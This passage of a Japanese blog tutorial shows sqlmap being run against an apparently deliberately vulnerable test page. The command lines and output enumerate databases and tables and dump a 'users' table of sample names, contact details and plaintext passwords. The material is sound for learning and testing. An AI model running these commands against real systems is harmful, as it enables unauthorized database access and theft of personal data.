+<a name="L.........................................."></a>
+<h2>データベースの一覧を取得する</h2>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./sqlmap.py -u <span class="s2">&quot;http://example.jp/sql_injection-003.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;ID=1&amp;PWD=2&quot;</span> --dbs
+</span><span class='line'>～ 略 ～
+</span><span class='line'>there were multiple injection points, please <span class="k">select </span>the one to use <span class="k">for </span>following injections:
+</span><span class='line'><span class="o">[</span>0<span class="o">]</span> place: POST, parameter: PWD, <span class="nb">type</span>: Single quoted string <span class="o">(</span>default<span class="o">)</span>　&lt;-ここでは0を選択する
+</span><span class='line'><span class="o">[</span>1<span class="o">]</span> place: POST, parameter: ID, <span class="nb">type</span>: Single quoted string
+</span><span class='line'><span class="o">[</span>q<span class="o">]</span> Quit
+</span><span class='line'>
+</span><span class='line'>～ 略 ～
+</span><span class='line'>
+</span><span class='line'>available databases <span class="o">[</span>3<span class="o">]</span>:
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> information_schema
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> pg_catalog
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> public
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>11:57:55<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetched data logged to text files under <span class="s1">&#39;/home/shyamahira/.sqlmap/output/example.jp&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> shutting down at 11:57:55
+</span></code></pre></td></tr></table></div></figure>
+
+
+<a name="L...................................."></a>
+<h2>テーブルの一覧を取得する</h2>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./sqlmap.py -u <span class="s2">&quot;http://example.jp/sql_injection-003.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;ID=1&amp;PWD=2&quot;</span> --tables
+</span><span class='line'>～ 略 ～
+</span><span class='line'>there were multiple injection points, please <span class="k">select </span>the one to use <span class="k">for </span>following injections:
+</span><span class='line'><span class="o">[</span>0<span class="o">]</span> place: POST, parameter: PWD, <span class="nb">type</span>: Single quoted string <span class="o">(</span>default<span class="o">)</span>　&lt;-ここでは0を選択する
+</span><span class='line'><span class="o">[</span>1<span class="o">]</span> place: POST, parameter: ID, <span class="nb">type</span>: Single quoted string
+</span><span class='line'><span class="o">[</span>q<span class="o">]</span> Quit
+</span><span class='line'>
+</span><span class='line'>～ 略 ～
+</span><span class='line'>
+</span><span class='line'>Database: pg_catalog
+</span><span class='line'><span class="o">[</span>42 tables<span class="o">]</span>
+</span><span class='line'>+-------------------------+
+</span><span class='line'>| pg_aggregate            |
+</span><span class='line'>| pg_am                   |
+</span><span class='line'>| pg_amop                 |
+</span><span class='line'>| pg_amproc               |
+</span><span class='line'>| pg_attrdef              |
+</span><span class='line'>| pg_attribute            |
+</span><span class='line'>| pg_auth_members         |
+</span><span class='line'>| pg_authid               |
+</span><span class='line'>| pg_cast                 |
+</span><span class='line'>| pg_class                |
+</span><span class='line'>| pg_constraint           |
+</span><span class='line'>| pg_conversion           |
+</span><span class='line'>| pg_database             |
+</span><span class='line'>| pg_depend               |
+</span><span class='line'>| pg_description          |
+</span><span class='line'>| pg_enum                 |
+</span><span class='line'>| pg_foreign_data_wrapper |
+</span><span class='line'>| pg_foreign_server       |
+</span><span class='line'>| pg_index                |
+</span><span class='line'>| pg_inherits             |
+</span><span class='line'>| pg_language             |
+</span><span class='line'>| pg_largeobject          |
+</span><span class='line'>| pg_listener             |
+</span><span class='line'>| pg_namespace            |
+</span><span class='line'>| pg_opclass              |
+</span><span class='line'>| pg_operator             |
+</span><span class='line'>| pg_opfamily             |
+</span><span class='line'>| pg_pltemplate           |
+</span><span class='line'>| pg_proc                 |
+</span><span class='line'>| pg_rewrite              |
+</span><span class='line'>| pg_shdepend             |
+</span><span class='line'>| pg_shdescription        |
+</span><span class='line'>| pg_statistic            |
+</span><span class='line'>| pg_tablespace           |
+</span><span class='line'>| pg_trigger              |
+</span><span class='line'>| pg_ts_config            |
+</span><span class='line'>| pg_ts_config_map        |
+</span><span class='line'>| pg_ts_dict              |
+</span><span class='line'>| pg_ts_parser            |
+</span><span class='line'>| pg_ts_template          |
+</span><span class='line'>| pg_type                 |
+</span><span class='line'>| pg_user_mapping         |
+</span><span class='line'>+-------------------------+
+</span><span class='line'>
+</span><span class='line'>Database: information_schema
+</span><span class='line'><span class="o">[</span>7 tables<span class="o">]</span>
+</span><span class='line'>+-------------------------+
+</span><span class='line'>| sql_features            |
+</span><span class='line'>| sql_implementation_info |
+</span><span class='line'>| sql_languages           |
+</span><span class='line'>| sql_packages            |
+</span><span class='line'>| sql_parts               |
+</span><span class='line'>| sql_sizing              |
+</span><span class='line'>| sql_sizing_profiles     |
+</span><span class='line'>+-------------------------+
+</span><span class='line'>
+</span><span class='line'>Database: public
+</span><span class='line'><span class="o">[</span>4 tables<span class="o">]</span>
+</span><span class='line'>+-------------------------+
+</span><span class='line'>| books                   |
+</span><span class='line'>| dummy                   |
+</span><span class='line'>| <span class="nb">test</span>                    |
+</span><span class='line'>| users                   |
+</span><span class='line'>+-------------------------+
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>12:06:06<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetched data logged to text files under <span class="s1">&#39;/home/shyamahira/.sqlmap/output/example.jp&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> shutting down at 12:06:06
+</span></code></pre></td></tr></table></div></figure>
+
+
+<a name="L..................................users............."></a>
+<h2>テーブルデータのダンプ(usersテーブル)</h2>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./sqlmap.py -u <span class="s2">&quot;http://example.jp/sql_injection-003.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;ID=1&amp;PWD=2&quot;</span> -T users --dump
+</span><span class='line'>～ 略 ～
+</span><span class='line'>there were multiple injection points, please <span class="k">select </span>the one to use <span class="k">for </span>following injections:
+</span><span class='line'><span class="o">[</span>0<span class="o">]</span> place: POST, parameter: PWD, <span class="nb">type</span>: Single quoted string <span class="o">(</span>default<span class="o">)</span>　&lt;-ここでは0を選択する
+</span><span class='line'><span class="o">[</span>1<span class="o">]</span> place: POST, parameter: ID, <span class="nb">type</span>: Single quoted string
+</span><span class='line'><span class="o">[</span>q<span class="o">]</span> Quit
+</span><span class='line'>
+</span><span class='line'>～ 略 ～
+</span><span class='line'>
+</span><span class='line'>Database: public
+</span><span class='line'>Table: users
+</span><span class='line'><span class="o">[</span>3 entries<span class="o">]</span>
+</span><span class='line'>+--------+--------------+----------+---------+--------------------+------+
+</span><span class='line'>| id     | tel          | <span class="nb">pwd</span>      | addr    | mail               | name |
+</span><span class='line'>+--------+--------------+----------+---------+--------------------+------+
+</span><span class='line'>| sato   | 045-123-4567 | password | 神奈川県横浜市 | sato@example.net   | 佐藤一志 |
+</span><span class='line'>| tanaka | 03-1234-5678 | pass1    | 東京都港区三田 | takana@example.com | 山石京子 |
+</span><span class='line'>| yamada | 046-123-4567 | pass1    | 神奈川県川崎市 | yamada@example.jp  | 山田太一 |
+</span><span class='line'>+--------+--------------+----------+---------+--------------------+------+
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>12:08:35<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> table <span class="s1">&#39;public.users&#39;</span> dumped to CSV file <span class="s1">&#39;/home/shyamahira/.sqlmap/output/example.jp/dump/public/users.csv&#39;</span>
+</span><span class='line'><span class="o">[</span>12:08:35<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetched data logged to text files under <span class="s1">&#39;/home/shyamahira/.sqlmap/output/example.jp&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> shutting down at 12:08:35
+</span></code></pre></td></tr></table></div></figure>
+
+
+<a name="L........."></a>
+<h2>最後に</h2>
+
+<p>sqlmapを実行した時、攻撃対象にどんなアクセスが来ているかについては
+時間のある時に追記したいと思います。</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">seak0503</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-05-20T07:35:25+09:00" pubdate data-updated="true">2014-05-20</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/security/'>Security</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://blog.seak.jp.net/blog/2014/05/20/sqlmap/" data-via="" data-counturl="http://blog.seak.jp.net/blog/2014/05/20/sqlmap/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/05/20/hydra/" title="Previous Post: hydraでブルートフォースアタックをする">&laquo; hydraでブルートフォースアタックをする</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/05/26/git-rebase-squash-fixup/" title="Next Post: git rebaseでsquashした場合とfixupした場合の違い">git rebaseでsquashした場合とfixupした場合の違い &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/11/26/dev-octopress/">Octopressの環境移設</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/07/sublimetextmacterminal/">Sublime Textから素早くiTermを開く</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/04/sublimetextthemecursor/">Sublime Text 3のカーソルを変更する手順</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/04/sublimetextthemeitg/">Themeのカラースキームを編集する</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/17/sublimetextvim/">sublimeText3でVimライクな操作を可能にさせる</a>
+      </li>
+    
+  </ul>
+</section>
+<section>
+  <h1>Categories</h1>
+    <ul id="category-list"><li><a href='/blog/categories/apache/'>Apache (1)</a></li><li><a href='/blog/categories/benchmark/'>Benchmark (1)</a></li><li><a href='/blog/categories/chef/'>Chef (2)</a></li><li><a href='/blog/categories/git/'>Git (9)</a></li><li><a href='/blog/categories/github/'>GitHub (8)</a></li><li><a href='/blog/categories/html/'>HTML (1)</a></li><li><a href='/blog/categories/java/'>Java (4)</a></li><li><a href='/blog/categories/linux/'>Linux (7)</a></li><li><a href='/blog/categories/markdown/'>Markdown (2)</a></li><li><a href='/blog/categories/octopress/'>Octopress (3)</a></li><li><a href='/blog/categories/oracle/'>Oracle (1)</a></li><li><a href='/blog/categories/python/'>Python (1)</a></li><li><a href='/blog/categories/ruby/'>Ruby (2)</a></li><li><a href='/blog/categories/security/'>Security (2)</a></li><li><a href='/blog/categories/sublime-text/'>Sublime Text (4)</a></li></ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/seak0503">@seak0503</a> on GitHub
+  
+  <script type="text/javascript">
+    $.domReady(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'seak0503',
+            count: 0,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - seak0503 -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'seak0503';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://blog.seak.jp.net/blog/2014/05/20/sqlmap/';
+        var disqus_url = 'http://blog.seak.jp.net/blog/2014/05/20/sqlmap/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
